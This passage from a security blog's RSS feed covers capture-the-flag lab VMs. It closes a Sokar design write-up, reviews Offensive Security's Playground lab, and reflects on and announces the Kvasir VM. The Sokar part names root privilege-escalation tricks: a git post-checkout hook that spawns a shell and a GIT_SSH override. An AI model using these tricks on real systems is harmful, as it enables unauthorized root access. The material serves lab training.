&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[apophis@sokar ~]$ git --version
git version 2.2.0
[apophis@sokar ~]$ mount
/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A post-checkout script will run as root, allowing you to kill the firewall and get a shell back for example.&lt;/p&gt;

&lt;p&gt;The simplicity of making &lt;code&gt;/etc/resolv.conf&lt;/code&gt; world-writable was a bit of a fudge.  I was originally planning on requiring an attacker to properly MiTM the VM, but I realised that would involve a significant alteration in people&amp;rsquo;s environment.  For example, my VBox internal-host network has no default gateway, so I&amp;rsquo;m not sure how a MiTM attack like ARP Spoofing would be achieved.&lt;/p&gt;

&lt;p&gt;The other, slightly easier route, is to take advantage of the git environmental variables, such as &lt;code&gt;GIT_SSH&lt;/code&gt;.  Export the variable to point at your own shell script, causes this to be run instead of the real ssh, also as root.&lt;/p&gt;

&lt;h2 id=&#34;conclusions&#34;&gt;Conclusions&lt;/h2&gt;

&lt;p&gt;It seems Sokar received mostly positive comments, I realise some may have been disappointed with a VM loaded with published vulnerabilities.&lt;/p&gt;

&lt;p&gt;If you have any comments or thoughts to add, please do so people.  Or get in touch with myself or VulnHub on Twitter, IRC or the world wide web.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Offensive Security: The Playground (Beta) Review</title>
      <link>https://rastamouse.me/guff/2014/offensive-security-the-playground-beta-review/</link>
      <pubDate>Sat, 06 Dec 2014 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/guff/2014/offensive-security-the-playground-beta-review/</guid>
      <description>&lt;p&gt;Offensive Security are launching a new Virtual Penetration Testing Lab, dubbed &lt;a href=&#34;http://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs&#34;&gt;The Playground&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For those who have already taken an Offensive Security course (e.g. PWK), you will already be familiar with the types of machines in the lab - mainly various flavours of Linux and Windows.  The Playground is even more versatile and also includes Citrix, Windows AD Domains, SCADA, IPS and anti-virus.&lt;/p&gt;

&lt;p&gt;I was incredibly lucky and was offered the chance to join the private beta program for testing the Playground; which involved attacking as many of the machines as possible and providing appropriate feedback to Offensive Security.  The intricate details of the lab will obviously remain private, but we were permitted to publish this final review of our experience.&lt;/p&gt;

&lt;p&gt;So without further ado&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Many of the queries posed by aspiring students are based around whether or not they are &amp;lsquo;ready&amp;rsquo;, or &amp;lsquo;experienced enough&amp;rsquo; to take PWK.  An important distinction to make is that the Playground is &lt;em&gt;not&lt;/em&gt; a structured course, but a &amp;lsquo;product&amp;rsquo; which can be effectively rented by organisations - super useful for staff training for example.&lt;/p&gt;

&lt;p&gt;The difficulty of the lab machines range from very easy to really very tough.  I say this based on my current level of experience:  a relatively inexperienced pentester - I started out as a hobbiest, and got a job pentesting full-time about a year ago.  I then passed PWK in April 2014.&lt;/p&gt;

&lt;p&gt;I was only able to spend ~1.5 week in the lab, out of the allocated slot of ~3 weeks, and in that time I was able to fully compromise 17 boxes across 2 subnets (and one router).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;So how does the difficulty of this lab compares to PWK?  In short, there are some machines in the Playground which I&amp;rsquo;d say are just as easy, if not easier, than those in the PWK lab.  But these don&amp;rsquo;t last long and the difficulty ramps up quite quickly.&lt;/p&gt;

&lt;p&gt;Some significant experience will be required to penetrate into the deeper subnets.&lt;/p&gt;

&lt;p&gt;I didn&amp;rsquo;t see any content from the PWK labs copied across to the Playground - this is all new content!  So if you have already completed PWK, don&amp;rsquo;t be concerned about repeated yourself.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Offensive Security recommend the use of their &lt;a href=&#34;https://www.offensive-security.com/kali-linux-vmware-arm-image-download/&#34;&gt;pre-built Kali VM images&lt;/a&gt;, but in truth a &lt;a href=&#34;https://www.kali.org/downloads/&#34;&gt;default Kali build&lt;/a&gt; from ISO is just as good.&lt;/p&gt;

&lt;p&gt;Access to the Playground is by way of VPN - once registered you receive a &amp;lsquo;Connectivity Pack&amp;rsquo;, containing VPN certs, username and password.  Connecting creates a new tap interface on your host, which is assigned an IP in the Playground DMZ.&lt;/p&gt;

&lt;p&gt;From there, you can port scan and attack the first subnet of the Playground.  Exploiting boxes in the DMZ reveals hosts which are &amp;lsquo;dual-honed&amp;rsquo;, allowing you to pivot into other networks.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I want to mention the new Dashboard, as there are several improvements over the one currently found in PWK.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/guff/playground/dashboard.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;At it&amp;rsquo;s most basic level, the Dashboard lists all of the available machines in the lab.  Participants can reboot or revert them at will (although restricted to a particular number per 24 hour period).  There is also an &amp;lsquo;admin&amp;rsquo; level dashboard where statistics can be tracked, batch reverting carried out and other functions.&lt;/p&gt;

&lt;p&gt;Each machine holds a text file, containing a short MD5 hash which can only be obtained when root/administrator privileges have been obtained.  This hash can be submitted against the relevant machine in the Dashboard, which then marks it as &amp;lsquo;owned&amp;rsquo; and increments your score.  For the beta test each box was given a score of 1 point, but when live they will have scores representative of their difficulty.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Without being able to talk about the machines in the lab, the technical review stops here.  I really enjoyed my experience with the parts of the lab I was able to interact with - the Offensive Security Team have done a really good job in creating a vibrant lab.&lt;/p&gt;

&lt;p&gt;There is so much variety in what is exploitable (old software, weak creds, password re-use, custom applications, you name it).  There are also levels of interaction between boxes, which simulate real-life scenarios and open up different avenues for attack (e.g. using one rooted box to leverage an attack against another).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Hand-on-heart, there was honestly not a single thing I out-right didn&amp;rsquo;t like about this lab.  Sure there were &amp;lsquo;issues&amp;rsquo; with some of the builds, but these will be fixed based on feedback from the beta program.  In terms of the overall design and implementation, I simply can&amp;rsquo;t fault it.&lt;/p&gt;

&lt;p&gt;One slight annoyance is the issue of reverting.  Giving everybody the ability to revert machines has both advantages and disadvantages - reverting a machine resets it back to its default configuration, meaning any changes made to it by the participants are removed. Obviously this reduces the overhead of having an administrator do it all the time.&lt;/p&gt;

&lt;p&gt;Also, it means that once a machine has been compromised, it can be reverted so the next participant can start from fresh. But since the lab is a shared environment multiple attackers can be working on it at the same time. Some like to revert a box before they start working on it to ensure it’s in a default state; but if somebody else is currently connected to it, they immediately lose their access and must re-exploit. This can be super-frustrating if you are trying to work on a privilege escalation; or using that box as a pivot into another subnet.&lt;/p&gt;

&lt;p&gt;I don’t see a reasonable technical solution to this, it’s more logistical and will very much depend on the organisation and how they want to manage it. Organisations won&amp;rsquo;t share lab access with another organisations, they get their own instance, so the issue can be managed internally.  As a minimum, I would recommend a courtesy IM/IRC/email message to your fellow hackers before reverting.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Now, to finish off this waffle, I would like to extend my sincere gratitude to &lt;a href=&#34;https://twitter.com/kalilinux&#34;&gt;muts&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/g0tmi1k&#34;&gt;g0tmi1k&lt;/a&gt; for inviting me to join the beta program; and to &lt;a href=&#34;https://twitter.com/loneferret&#34;&gt;loneferret&lt;/a&gt;, who also put a lot of work in the lab to make our lives a misery!&lt;/p&gt;

&lt;p&gt;Kudos to Offensive Security, you should all be very proud of what you have achieved - now you just need get AWAE online!! :D&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Kvasir: I Follow Up</title>
      <link>https://rastamouse.me/guff/2014/kvasir-1-follow-up/</link>
      <pubDate>Sun, 16 Nov 2014 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/guff/2014/kvasir-1-follow-up/</guid>
      <description>&lt;p&gt;It&amp;rsquo;s been about a month since Kvasir I was made available on &lt;a href=&#34;https://www.vulnhub.com/entry/kvasir-i,106/&#34;&gt;VulnHub&lt;/a&gt;, so I thought I would write a follow-up post about it.  In some ways, it was a vulnerable VM which went in a different direction to the ones we are used to.  It was also the first VM I have produced, so I wanted to jot down a few notes about what I thought worked well and what didn&amp;rsquo;t.&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;p&gt;These are my views, from being its &amp;lsquo;author&amp;rsquo; and from the feedback I&amp;rsquo;ve had from those who have attempted the challenge.  If you disagree or have anything to add, please add a comment below.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This post may contain spoilers.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;the-good&#34;&gt;The Good&lt;/h2&gt;

&lt;p&gt;I&amp;rsquo;ll start with what I feel were the positives.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;After an external entry point, most VMs will have a form of privilege escalation.  This may involve hopping from a service account (such as apache) to a low priv user, to a higher priv user (e.g. with sudo rights) and finally to root.&lt;/p&gt;

&lt;p&gt;Longer VMs tend to require one to hop between multiple users, usually via SUID permissions.  &lt;a href=&#34;https://www.vulnhub.com/entry/hell-1,95/&#34;&gt;Hell&lt;/a&gt; is a good example of this methodology.&lt;/p&gt;

&lt;p&gt;I wanted to do something different for Kvasir, so I introduced the use of &lt;a href=&#34;https://linuxcontainers.org&#34;&gt;LXC&lt;/a&gt;, which allows one to simulate multiple running kernels within the same VM.  I combined this with some creative networking to simulate a LAN, with multiple boxes to exploit.&lt;/p&gt;

&lt;p&gt;I felt this was a nicely refreshing &amp;lsquo;feature&amp;rsquo; and allowed the player to solve new problems, such as pivoting.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;The variety.  Having a mix of multiple LANs/NICs and boxes, allowed me to fit a large variety of different vulnerabilities into the challenge.  I was able to include more network-based vulns to breach each box, and different local vulns on each of those.&lt;/p&gt;

&lt;p&gt;This was a double-edged sword however, as the sheer number of vulns made it very difficult to come up with exciting and unique challenges.  I therefore had to draw upon challenges that have made appearances in other places, but add slightl twists to them.&lt;/p&gt;

&lt;p&gt;Overall, I felt the variety was good for the player but they could have been more unique.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;The story.  One of the things I had tried to achieve with Kvasir, was to simulate something that could look like a real-life network.  To this end, I created a &amp;lsquo;public-facing&amp;rsquo; element and as the player steps through the network they find &amp;lsquo;development&amp;rsquo; boxes and finally an &amp;lsquo;admin&amp;rsquo; box.&lt;/p&gt;

&lt;p&gt;There was also evidence of users interacting with services and users on the other boxes, which I hope added to this feeling for the player.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;the-bad-not-so-good&#34;&gt;The &lt;del&gt;Bad&lt;/del&gt; Not-so-Good&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;The length!  This VM was probably right on the edge of what people&amp;rsquo;s patience and sanity could withstand.  Roughly counting, around 9 exploits are needed before the final flag can be reached - and it&amp;rsquo;s not like all of them were short.&lt;/p&gt;

&lt;p&gt;After completing the VM, I hope the players felt a good sense of satisfaction and I am doubly-grateful for those who then went on to publish a write-up.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve not had anybody say so, but I&amp;rsquo;m sure there have been people who have completed the VM but not done a write-up because of the time it would take - which is absolutely fair enough.  We&amp;rsquo;re not all made of time and a lot us have families etc.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;There are 5 containers in total, but only 2 of them are designed to be rootable.  Rooting a VM gives the player a feeling of acomplishment, but the information I wanted to give to the player (so they could proceed) was given to them as standard users on these other (un-rootable) boxes.&lt;/p&gt;

&lt;p&gt;I could have extended the challenge so that root had to be obtained before that information was disclosed, but it didn&amp;rsquo;t really fit the &amp;lsquo;story&amp;rsquo;, it would&amp;rsquo;ve increased the length of the VM even more and it would mean I&amp;rsquo;d have to think up even more vulns.&lt;/p&gt;

&lt;p&gt;Given the trade-off, I decided it would be better to keep some containers un-rootable (by design anyway).&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;the-ugly&#34;&gt;The Ugly&lt;/h2&gt;

&lt;p&gt;I don&amp;rsquo;t think, and hopefully the players will agree, that there was nothing about this VM which was truly awful.  I&amp;rsquo;ve not had any stronly negative feedback (maybe you&amp;rsquo;re all too nice).&lt;/p&gt;

&lt;p&gt;If you feel differently - please say so!&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Kvasir: I Released</title>
      <link>https://rastamouse.me/guff/2014/kvasir-1-released/</link>
      <pubDate>Fri, 16 May 2014 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/guff/2014/kvasir-1-released/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;After the war between the Aesir and Vanir, all the Gods made a truce by spitting into a bowl. They stirred up the mixture and created a new God of Knowledge. His name was Kvasir and he was made the most amazing diplomat to prevent further disagreements.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Sadly he didn’t last long as he was slaughtered by treacherous dwarves, who drained his blood, mixed it with honey and fermented it into a highly potent mead. This became known as Kvas - the Mead of Inspiration - a fiery brew the colour of beetroot. Drinking it was a highly enlightening experience.&lt;/p&gt;

&lt;p&gt;Can you beat Kvasir, capture the flag and gain enlightenment?&lt;/p&gt;

&lt;p&gt;Get it exclusively from &lt;a href=&#34;https://www.vulnhub.com/entry/kvasir-i,106/&#34;&gt;VulnHub&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    
  </channel>
</rss>